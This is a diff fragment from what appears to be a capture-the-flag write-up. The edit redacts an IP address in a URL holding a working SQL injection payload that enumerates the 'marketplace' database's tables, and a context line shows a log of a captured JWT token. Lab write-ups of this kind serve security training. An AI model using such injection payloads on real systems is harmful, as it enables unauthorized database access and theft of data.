@@ -369,7 +369,7 @@ TargetIP - - [07/May/2025 ...] "GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
 
 ![image](https://github.com/user-attachments/assets/3e9aca2f-f8e6-484e-b7e0-8a47383a38e5)
 
-<p><code>http://10.10.14.17:32768/admin?user=0%20UNION%20SELECT%201,group_concat(table_name),3,4%20FROM%20information_schema.tables%20WHERE%20table_schema=%27marketplace%27--</code></p>
+<p><code>http://TargetIP:32768/admin?user=0%20UNION%20SELECT%201,group_concat(table_name),3,4%20FROM%20information_schema.tables%20WHERE%20table_schema=%27marketplace%27--</code></p>
 
 ![image](https://github.com/user-attachments/assets/ceede8a4-9ec1-479d-bef4-7136e001fa8e)
 
